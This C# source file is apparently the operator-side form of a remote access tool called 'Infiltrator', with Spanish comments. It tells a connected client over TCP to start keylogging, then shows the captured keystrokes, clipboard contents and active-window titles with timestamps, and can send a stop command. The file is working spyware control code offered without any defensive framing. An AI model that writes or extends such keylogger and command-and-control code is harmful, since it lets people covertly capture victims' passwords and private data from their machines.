using System.Net.Sockets;
using Server.Conexion;



namespace Server
{
    public partial class Keylogger : Form
    {
        public static Keylogger Instance { get; private set; }
        private TcpClient _cliente;
        private int _idCliente;

        private string _lastClipboardContent = string.Empty;
        private string _lastActiveWindow = string.Empty;
        public Keylogger(int id, TcpClient cliente)
        {
            InitializeComponent();
            Instance = this;
            _cliente = cliente;
            _idCliente = id;
            this.Text = $"Keylogger Remoto - Cliente {_idCliente}";
        }

        private void Keylogger_Load(object sender, EventArgs e)
        {
            ServerSocket.SendCommand(_idCliente, "keylogger");

            richTextBox1.AppendText("Infiltrator Keylogger Log[version 1.0]\n");
            richTextBox1.AppendText("---------------------------------------\n");
            richTextBox2.AppendText("Infiltrator Keylogger Clipboard content[version 1.0]\n");
            richTextBox2.AppendText("-----------------------------------------------------\n");
            richTextBox3.AppendText("Infiltrator Keylogger Active Window [version 1.0]\n");
            richTextBox3.AppendText("--------------------------------------------------\n");

        }


        public void AppendLog(string output)
        {
            string timestamp = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");

           
            if (InvokeRequired)
            {

                Invoke(new Action<string>(AppendLog), output);
                return;

            }

            richTextBox1.AppendText($"{timestamp}-[Infiltrator Keylogger]>"+output + Environment.NewLine);

        }

        public void AppendClipboard(string output)
        {
            string timestamp = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");

            // Verificar si el contenido del portapapeles ha cambiado
            if (_lastClipboardContent != output)
            {
                if (InvokeRequired)
                {
                    Invoke(new Action<string>(AppendClipboard), output);
                    return;
                }

                richTextBox2.AppendText($"{timestamp}-[Clipboard content]> {output}{Environment.NewLine}");
                _lastClipboardContent = output; // Actualizar el contenido guardado
            }

        }

        public void AppendActiveWindow(string output)
        {
            string timestamp = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");

            // Verificar si el nombre de la ventana activa ha cambiado
            if (_lastActiveWindow != output)
            {
                if (InvokeRequired)
                {
                    Invoke(new Action<string>(AppendActiveWindow), output);
                    return;
                }

                richTextBox3.AppendText($"{timestamp}-[Current Active Window]> {output}{Environment.NewLine}");
                _lastActiveWindow = output; // Actualizar la ventana activa guardada
            }

        }

        private void button1_Click(object sender, EventArgs e)
        {
            ServerSocket.SendCommand(_idCliente,"keylogger stop");
            this.Close();
        }
    }
}
